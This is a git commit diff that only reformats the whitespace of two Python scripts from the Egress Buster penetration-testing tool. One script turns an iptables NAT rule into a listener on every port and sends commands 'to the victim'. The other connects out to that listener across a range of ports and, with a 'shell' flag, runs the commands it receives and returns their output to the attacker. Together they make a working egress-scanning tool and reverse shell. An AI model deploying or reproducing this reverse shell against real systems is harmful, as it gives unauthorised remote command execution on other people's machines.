eaba39544fe68012ac9e6a91e4922111443a518e
g0tmi1k <have.you.g0tmi1k@gmail.com>
2016-03-12 21:36:31 +0000

    Changed spacing

--- egress_listener.py
+++ egress_listener.py
@@ -7,10 +7,10 @@
 #
 # Listener can only be run on Linux due to iptables support.
 # 
-import threading
 import SocketServer
-import sys
 import subprocess
+import sys
+import threading
 import time
 
 # define empty variable
@@ -18,12 +18,12 @@ shell = ""
 
 # assign arg params
 try:
-        ipaddr = sys.argv[1]
-	eth = sys.argv[2]
+    ipaddr = sys.argv[1]
+    eth = sys.argv[2]
 
 # if we didnt put anything in args
 except IndexError:
-        print """
+    print """
 Egress Buster v0.2 - Find open ports inside a network
 
 This will route all ports to a local port and listen on every port. This
@@ -37,54 +37,59 @@ Usage: python egress_listener.py <your_local_ip_addr> <eth_interface_for_listene
 
 Example: python egress_listener.py 192.168.13.10 eth0 shell
         """
-        sys.exit()
+    sys.exit()
 
 # assign shell
-try: shell = sys.argv[3]
-except: pass
+try:
+    shell = sys.argv[3]
+except:
+    pass
+
 
 # base class handler for socket server
 class ThreadedTCPRequestHandler(SocketServer.BaseRequestHandler):
+    # handle the packet
+    def handle(self):
+        self.data = self.request.recv(1024).strip()
+        print "%s connected on port: %s\n" % (self.client_address[0], self.data)
+        if shell == "shell":
+            while 1:
+                request = raw_input("Enter the command to the victim: ")
+                if request != "":
+                    self.request.sendall(request)
+                    if request == "quit" or request == "exit": break
+                    try:
+                        self.data = self.request.recv(1024).strip()
+                        print self.data
 
-	# handle the packet
-        def handle(self):
-        	self.data = self.request.recv(1024).strip()
-        	print "%s connected on port: %s\n" % (self.client_address[0],self.data)
-		if shell == "shell":
-			while 1:
-				request = raw_input("Enter the command to the victim: ")
-				if request != "":
-		        		self.request.sendall(request)
-					if request == "quit" or request == "exit": break
-					try:
-						self.data = self.request.recv(1024).strip()
-						print self.data
+                    except:
+                        pass
 
-					except: pass
 
 class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer): pass
 
+
 if __name__ == "__main__":
 
-	try:
-		print "[*] Inserting iptables to redirect allports to port 10900"
-		subprocess.Popen(" iptables -t nat -A PREROUTING -i %s -p tcp  --dport 1:65535 -j DNAT --to-destination %s:10900" % (eth,ipaddr), shell=True).wait()
-		# threaded server to handle multiple TCP connections
-		socketserver = ThreadedTCPServer(('', 10900), ThreadedTCPRequestHandler)
-                socketserver_thread = threading.Thread(target=socketserver.serve_forever)
-                socketserver_thread.setDaemon(True)
-                socketserver_thread.start()
-		print "[*] Listening on all ports now. Hit control-c when finished."
+    try:
+        print "[*] Inserting iptables to redirect allports to port 10900"
+        subprocess.Popen(
+            " iptables -t nat -A PREROUTING -i %s -p tcp  --dport 1:65535 -j DNAT --to-destination %s:10900" % (
+            eth, ipaddr), shell=True).wait()
+        # threaded server to handle multiple TCP connections
+        socketserver = ThreadedTCPServer(('', 10900), ThreadedTCPRequestHandler)
+        socketserver_thread = threading.Thread(target=socketserver.serve_forever)
+        socketserver_thread.setDaemon(True)
+        socketserver_thread.start()
+        print "[*] Listening on all ports now. Hit control-c when finished."
 
-	        while 1:
-			try:
-		        	time.sleep(1)
+        while 1:
+            try:
+                time.sleep(1)
 
-			except KeyboardInterrupt:
-				print "\n[*]Exiting, flushing iptables to remove entries."
-				subprocess.Popen("iptables -F", shell=True).wait()
-				sys.exit()
-	except Exception, e:
-        	print "An issue occured, printing error: " + str(e)
-
-
+            except KeyboardInterrupt:
+                print "\n[*]Exiting, flushing iptables to remove entries."
+                subprocess.Popen("iptables -F", shell=True).wait()
+                sys.exit()
+    except Exception, e:
+        print "An issue occured, printing error: " + str(e)
--- egressbuster.py
+++ egressbuster.py
@@ -17,14 +17,14 @@ import os
 
 # try to import
 try:
-        ipaddr = sys.argv[1]
-        portrange = sys.argv[2]
-        portrange = portrange.split("-")
-        lowport = int(portrange[0])
-        highport = int(portrange[1])        
+    ipaddr = sys.argv[1]
+    portrange = sys.argv[2]
+    portrange = portrange.split("-")
+    lowport = int(portrange[0])
+    highport = int(portrange[1])
 
 except IndexError:
-        print """
+    print """
 
         TrustedSec, LLC
    https://www.trustedsec.com
@@ -44,76 +44,80 @@ egressbuster.exe <listener_ip_address> <lowport-highport> <optional_flag_shell>
 
 example: egressbuster.exe 10.9.5.2 1-65536 shell
         """
-        sys.exit()
+    sys.exit()
 
 shell = ""
-try: shell = sys.argv[3]
-except: pass
+try:
+    shell = sys.argv[3]
+except:
+    pass
 
 # cycle through ranges
-base_port = int(lowport)-1
+base_port = int(lowport) - 1
 end_port = int(highport)
 
 print "Sending packets to egress listener..."
 
-def start_socket(ipaddr,base_port, shell):
 
-        # try block to catch exceptions        
-        try:
-                sockobj = socket(AF_INET, SOCK_STREAM)
-                sockobj.connect((ipaddr, base_port))
-                sockobj.send(str(base_port))
-		sockobj.send('[*] Connection Established!')
-		if shell == "shell":
-			# start loop
-			while 1:
-	                        # recieve shell command
-	  			data = sockobj.recv(1024)
-	   			# if its quit, then break out and close socket
-	                        if data == "quit": break	
-	     			# do shell command
-				if data.startswith("cd "):
-					data = data.replace("cd ", "")
-					cwd = os.getcwd()
-					if os.path.isdir(cwd + data):
-						if data != "/":
-							data = cwd + data
+def start_socket(ipaddr, base_port, shell):
+    # try block to catch exceptions
+    try:
+        sockobj = socket(AF_INET, SOCK_STREAM)
+        sockobj.connect((ipaddr, base_port))
+        sockobj.send(str(base_port))
+        sockobj.send('[*] Connection Established!')
+        if shell == "shell":
+            # start loop
+            while 1:
+                # recieve shell command
+                data = sockobj.recv(1024)
+                # if its quit, then break out and close socket
+                if data == "quit": break
+                # do shell command
+                if data.startswith("cd "):
+                    data = data.replace("cd ", "")
+                    cwd = os.getcwd()
+                    if os.path.isdir(cwd + data):
+                        if data != "/":
+                            data = cwd + data
 
-					if os.path.isdir(data):
-						print data
-						os.chdir(data)
-						stdout_value = "Changed directory."
- 
-					else:
-						stdout_value ="Invalid directory. Be sure to use full pathnames to change directories. Not individual directories."
+                    if os.path.isdir(data):
+                        print data
+                        os.chdir(data)
+                        stdout_value = "Changed directory."
 
-				else:
-		    			proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-		    			# read output
-		    			stdout_value = proc.stdout.read() + proc.stderr.read()
-		    			# send output to attacker
+                    else:
+                        stdout_value = "Invalid directory. Be sure to use full pathnames to change directories. Not individual directories."
 
-	     			sockobj.send(stdout_value)
-			# close socket
-			sockobj.close()
-			sys.exit()
-        		    
-        # if we throw an error
-	finally: print "test"
-#        except Exception,e :
+                else:
+                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                            stdin=subprocess.PIPE)
+                    # read output
+                    stdout_value = proc.stdout.read() + proc.stderr.read()
+                    # send output to attacker
+
+                sockobj.send(stdout_value)
+            # close socket
+            sockobj.close()
+            sys.exit()
+
+    # if we throw an error
+    finally:
+        print "test"
+
+
+# except Exception,e :
 #		print e
-                # pass through, ports closed
-#                pass
+# pass through, ports closed
+#       pass
 
 while 1:
-        base_port = base_port + 1
-        thread.start_new_thread(start_socket, (ipaddr,base_port, shell))
-        time.sleep(0.01)
-        if base_port == end_port:
-                break
+    base_port = base_port + 1
+    thread.start_new_thread(start_socket, (ipaddr, base_port, shell))
+    time.sleep(0.01)
+    if base_port == end_port:
+        break
 
 print "All packets have been sent"
 while 1:
-        time.sleep(50)
-
-
+    time.sleep(50)
